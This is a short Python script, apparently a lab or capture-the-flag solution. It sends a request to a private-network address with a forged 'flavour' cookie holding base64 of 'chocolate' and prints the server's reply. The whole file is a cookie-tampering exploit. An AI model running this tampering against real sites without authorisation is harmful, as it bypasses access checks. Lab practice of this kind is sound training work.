#!/usr/bin/env python3
import base64
from urllib.request import Request, urlopen

BASE_URL = "http://10.0.118.48:8888/"


def get_text(url: str, cookie: str | None = None) -> str:
    headers = {}
    if cookie is not None:
        headers["Cookie"] = cookie
    req = Request(url, headers=headers)
    with urlopen(req, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


def main() -> None:
    chocolate_b64 = base64.b64encode(b"chocolate").decode()
    cookie = f"flavour={chocolate_b64}"

    body = get_text(BASE_URL, cookie=cookie).strip()

    print("[+] tampered cookie:", cookie)
    print("[+] response:", body)


if __name__ == "__main__":
    main()
